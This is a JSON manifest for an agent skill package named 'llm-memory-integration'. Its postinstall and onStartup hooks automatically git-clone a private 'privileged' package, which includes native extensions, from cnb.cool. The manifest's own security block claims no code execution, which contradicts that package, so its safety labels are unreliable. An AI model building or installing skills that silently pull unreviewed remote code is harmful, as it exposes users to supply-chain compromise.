{
  "name": "llm-memory-integration",
  "version": "8.0.1",
  "description": "LLM Memory Integration - 接口层 + 自动化钩子。安装后自动从 CNB 仓库拉取私有增强包。",
  "license": "MIT-0",
  "author": "xkzs2007",
  "homepage": "https://clawhub.ai/skill/llm-memory-integration",
  "keywords": ["memory", "search", "interface", "api", "hooks", "auto-install"],
  "requirements": {
    "binaries": {
      "required": ["python3", "git"],
      "description": "Python 3 和 Git（钩子需要 git 克隆私有包）"
    },
    "envVars": {
      "required": [],
      "optional": []
    },
    "network": {
      "required": true,
      "endpoints": ["https://cnb.cool/llm-memory-integrat/llm"],
      "description": "钩子需要网络访问 CNB 仓库克隆私有包"
    },
    "filesystem": {
      "read": ["~/.openclaw/memory-tdai"],
      "write": [
        "~/.openclaw/memory-tdai",
        "~/.openclaw/workspace/skills/llm-memory-integration/src/privileged"
      ]
    }
  },
  "security": {
    "code_execution": false,
    "native_extensions": false,
    "subprocess_calls": true,
    "subprocess_description": "钩子会调用 git clone 命令",
    "network_access": true,
    "network_description": "钩子会访问 cnb.cool 下载私有包",
    "description": "公开包本身无风险，但钩子会执行网络操作和 subprocess 调用"
  },
  "hooks": {
    "postinstall": "hooks/postinstall.py",
    "onStartup": "hooks/onStartup.py",
    "description": "生命周期钩子，自动从 CNB 拉取私有包"
  },
  "privileged_package": {
    "url": "https://cnb.cool/llm-memory-integrat/llm",
    "architectures": ["x64", "arm64"],
    "auto_install": true,
    "description": "私有增强包，包含高性能实现、原生扩展、API 集成"
  },
  "repository": {
    "type": "git",
    "url": "https://gitee.com/xkzs2007/llm-memory-integration"
  }
}
